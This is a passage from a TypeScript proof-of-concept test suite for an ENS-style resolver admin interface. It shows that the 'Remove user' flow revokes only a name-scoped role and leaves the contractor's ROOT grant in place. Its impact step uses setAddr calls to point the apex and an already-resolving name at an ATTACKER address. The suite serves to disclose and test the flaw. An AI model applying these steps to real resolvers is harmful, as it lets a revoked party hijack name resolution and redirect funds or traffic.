  node: '' | string,
  checkboxId: string,
) => {
  const before = handedOff.length
  renderWithRouter(
    <ResolverAddUserSheet
      open
      onOpenChange={() => {}}
      resolverAddress={RESOLVER}
      nodes={NODES}
    />,
  )

  // The account. A raw 0x address resolves instantly, with no lookup.
  await user.type(
    await screen.findByPlaceholderText(/name or address/i),
    CONTRACTOR,
  )

  // The scope. The sheet DEFAULTS to root, so only a name needs selecting.
  if (node !== '') {
    await user.click(screen.getByPlaceholderText('Root (all nodes)'))
    await user.click(await screen.findByText(node))
  }

  const box = document.getElementById(checkboxId)
  if (!box) throw new Error(`checkbox ${checkboxId} not rendered`)
  await user.click(box)

  const save = await screen.findByRole('button', { name: /^save$/i })
  await waitFor(() => expect(save).not.toBeDisabled())
  await user.click(save)

  await user.click(await screen.findByRole('button', { name: /^start$/i }))
  const handoff = await clickThroughWallet(user)
  expect(handedOff.length).toBeGreaterThan(before)

  const receipt = await sendFrom(ADMIN, handoff.to, handoff.data)
  expect(receipt.status, 'the grant must land').toBe('success')
  cleanup()
  return handoff
}

const nodeOf = (name: string) =>
  (NAMES.find(([n]) => n === name) as readonly [string, Hex])[1]

const addrOf = (node: Hex) =>
  pub.readContract({
    address: RESOLVER,
    abi: ADDR_ABI,
    functionName: 'addr',
    args: [node],
  })

const writeReverts = async (p: Promise<{ readonly status: string }>) =>
  p
    .then((r) => r.status === 'reverted')
    .catch((e: unknown) => {
      const err = e as {
        message?: string
        details?: string
        shortMessage?: string
      }
      const text = [err?.message, err?.details, err?.shortMessage]
        .filter(Boolean)
        .join('\n')
      if (/revert|EACUnauthorized/i.test(text)) return true
      throw e
    })

const contractorSetsAddr = (node: Hex) =>
  walletFor(CONTRACTOR)
    .writeContract({
      address: RESOLVER,
      abi: SET_ADDR_ABI,
      functionName: 'setAddr',
      args: [node, ATTACKER],
      chain: sepolia,
    })
    .then((hash) => pub.waitForTransactionReceipt({ hash }))

const rolesAt = (resource: Hex, account: Address) =>
  pub.readContract({
    address: RESOLVER,
    abi: ROLES_ABI,
    functionName: 'roles',
    args: [BigInt(resource), account],
  })

const hasRoot = (bit: bigint, account: Address) =>
  pub.readContract({
    address: RESOLVER,
    abi: HAS_ROOT_ROLES_ABI,
    functionName: 'hasRootRoles',
    args: [bit, account],
  })

const canManageRolesFromChain = () =>
  pub.readContract({
    address: RESOLVER,
    abi: HAS_ROOT_ROLES_ABI,
    functionName: 'hasRootRoles',
    args: [1n << 0n, ADMIN],
  }) as Promise<boolean>

describe('F1-B — PATH 4: a revocation the UI calls complete leaves ROOT intact', () => {
  it('0. PRECONDITIONS: the contractor holds nothing, and the fixture is the live one', async () => {
    // The contractor is genuinely unprivileged before anything happens.
    for (const bit of [1n << 0n, 1n << 4n]) {
      expect(
        await hasRoot(bit, CONTRACTOR),
        'contractor must start clean',
      ).toBe(false)
    }
    const scopedResource = computeNameResource(SCOPED_NAME) as Hex
    expect(await rolesAt(scopedResource, CONTRACTOR)).toBe(0n)

    // NEGATIVE CONTROL: it cannot write a record on this resolver at all.
    // Without this, "it can write afterwards" would prove nothing.
    expect(
      await writeReverts(contractorSetsAddr(nodeOf(APEX))),
      'contractor must not be able to write the apex yet',
    ).toBe(true)

    // The admin really can grant — this is what `canManageRoles` derives from.
    expect(await hasRoot(1n << 0n, ADMIN)).toBe(true)

    // The node list is the live one, so the name we scope to is a real node
    // this resolver actually serves — not an invented fixture.
    const body = await indexerQuery<{
      data?: { resolver?: { nodes: { name: string }[] } | null }
    }>(`{resolver(id:"${RESOLVER}"){nodes{name}}}`)
    // NO SOFT-FAIL — see the note in poc-f1-organic-endtoend: an outage must
    // surface as a failure, not as a green run with the checks skipped.
    if (!body) {
      // NO SILENT SKIP. An unreachable indexer fails this test rather than
      // quietly disabling the anti-fabrication cross-checks while the run
      // still reports green. Every ON-CHAIN assertion above has already run.
      // A reviewer who genuinely cannot reach the endpoint opts out
      // explicitly with POC_SKIP_INDEXER=1 — and then knows they did.
      if (process.env.POC_SKIP_INDEXER === '1') return
      throw new Error(
        'indexer unreachable — the fixture cross-checks could not run. ' +
          'Re-run, or set POC_SKIP_INDEXER=1 to proceed without them.',
      )
    }
    const liveNames = body.data?.resolver?.nodes?.map((n) => n.name) ?? []
    expect(
      liveNames.length,
      'indexer must serve this resolver',
    ).toBeGreaterThan(0)
    expect(liveNames, `${SCOPED_NAME} must be a real node`).toContain(
      SCOPED_NAME,
    )
    const fixtureNames = new Set(NAMES.map(([n]) => n))
    for (const name of liveNames) {
      expect(fixtureNames.has(name), `fixture omits live node ${name}`).toBe(
        true,
      )
    }
  }, 300_000)

  it('1. IN-SCOPE SETUP: Add User grants ROOT, through the real sheet', async () => {
    const user = userEvent.setup({ pointerEventsCheck: 0 })
    const handoff = await grantViaAddUserSheet(
      user,
      '',
      'add-ROLE_SET_ADDR-manager',
    )

    expect(handoff.data.slice(0, 10)).toBe(
      toFunctionSelector('grantRootRoles(uint256,address)'),
    )
    expect(
      await hasRoot(1n << 0n, CONTRACTOR),
      'contractor now holds ROOT',
    ).toBe(true)
  }, 300_000)

  it('2. IN-SCOPE SETUP: Add User grants a NAME-scoped role to the same account', async () => {
    const user = userEvent.setup({ pointerEventsCheck: 0 })
    // No duplicate-account guard: `canSave` checks only address + >=1 role
    // (ResolverAddUserSheet.tsx:183), so the same account can be granted twice.
    const handoff = await grantViaAddUserSheet(
      user,
      SCOPED_NAME,
      'add-ROLE_SET_TEXT-manager',
    )

    expect(handoff.data.slice(0, 10)).toBe(
      toFunctionSelector('authorizeNameRoles(bytes,uint256,address,bool)'),
    )
    const scopedResource = computeNameResource(SCOPED_NAME) as Hex
    expect(
      await rolesAt(scopedResource, CONTRACTOR),
      'the name-scoped grant must exist',
    ).not.toBe(0n)
  }, 300_000)

  it('3. THE DEFECT: row reads "Global roles (all names)", but Remove emits a NAME-scoped revoke', async () => {
    const user = userEvent.setup({ pointerEventsCheck: 0 })
    const canManage = await canManageRolesFromChain()
    const scopedResource = computeNameResource(SCOPED_NAME) as Hex

    // The two grants as the indexer now reports them — one account, two rows.
    const rows = [
      { resource: ROOT_RESOURCE, roleBitmap: (1n << 0n).toString() },
      { resource: scopedResource, roleBitmap: (1n << 4n).toString() },
    ].map((r) => ({
      account: CONTRACTOR,
      ...r,
      blockNumber: 1,
      transactionHash: null,
      timestamp: null,
      name: null,
    }))

    renderWithRouter(
      <ResolverRolesTable
        roles={rows}
        nodes={NODES}
        resolverAddress={RESOLVER}
        canManageRoles={canManage}
      />,
    )

    const cell = await screen.findByText(/0x7099/i)
    const row = cell.closest('tr')
    if (!row) throw new Error('contractor row not rendered')
    await user.click(
      within(row as HTMLElement).getByRole('button', {
        name: /edit user roles/i,
      }),
    )

    // WHAT THE ADMIN IS TOLD: global. This is the whole point — the sidebar
    // reports the widest scope the row carries...
    expect(await screen.findByText('Global roles (all names)')).toBeVisible()

    await user.click(
      await screen.findByRole('button', { name: /remove user/i }),
    )
    // ...and the dialog promises removal from ALL of them.
    expect(
      await screen.findByText(/remove this user from all roles/i),
    ).toBeVisible()

    // The dialog's confirm button is labelled "Remove" (sidebar :454-462).
    await user.click(await screen.findByRole('button', { name: /^remove$/i }))
    await user.click(await screen.findByRole('button', { name: /^start$/i }))
    const handoff = await clickThroughWallet(user)

    // ...WHAT IS ACTUALLY SENT: a NAME-scoped revoke. Never revokeRootRoles.
    expect(handoff.data.slice(0, 10)).toBe(
      toFunctionSelector('authorizeNameRoles(bytes,uint256,address,bool)'),
    )
    expect(handoff.data.slice(0, 10)).not.toBe(
      toFunctionSelector('revokeRootRoles(uint256,address)'),
    )

    const receipt = await sendFrom(ADMIN, handoff.to, handoff.data)
    expect(receipt.status).toBe('success')
  }, 300_000)

  it('4. IMPACT: ROOT survives the removal, and the contractor uses it', async () => {
    const scopedResource = computeNameResource(SCOPED_NAME) as Hex

    // CONTROL: the transaction was NOT a no-op — the name-scoped grant really
    // was revoked. So this is not "the tx failed"; it did exactly what it said,
    // at the wrong scope.
    expect(
      await rolesAt(scopedResource, CONTRACTOR),
      'the name-scoped grant SHOULD be gone',
    ).toBe(0n)

    // THE FAILURE: global authority survives a removal the UI called complete.
    expect(
      await hasRoot(1n << 0n, CONTRACTOR),
      'ROOT survived "remove this user from all roles"',
    ).toBe(true)

    // ── CONSEQUENCE ───────────────────────────────────────────────────────
    // A surviving permission bit is not yet an impact. Exercise it: the
    // "removed" contractor writes records it was never scoped to, on a
    // resolver the admin believes it no longer has any access to.

    // (a) the APEX — never in its scope at any point, only ever sarah.acme.eth
    const apexNode = nodeOf(APEX)
    const apexReceipt = await contractorSetsAddr(apexNode)
    expect(
      apexReceipt.status,
      'the "removed" contractor can write the apex',
    ).toBe('success')
    expect((await addrOf(apexNode)).toLowerCase()).toBe(ATTACKER.toLowerCase())

    // (b) a name that ALREADY resolved to a real address — so this is a
    //     REDIRECT of live resolution, not the filling of an empty record.
    const liveNode = nodeOf(ALREADY_RESOLVING)
    const priorAddr = (await addrOf(liveNode)).toLowerCase()
    expect(priorAddr, `${ALREADY_RESOLVING} resolved before`).not.toBe(
      '0x0000000000000000000000000000000000000000',
    )
    expect(priorAddr).not.toBe(ATTACKER.toLowerCase())

    const liveReceipt = await contractorSetsAddr(liveNode)
    expect(liveReceipt.status).toBe('success')
    expect(
      (await addrOf(liveNode)).toLowerCase(),
      `${ALREADY_RESOLVING} was redirected`,
    ).toBe(ATTACKER.toLowerCase())
  }, 300_000)
})

```
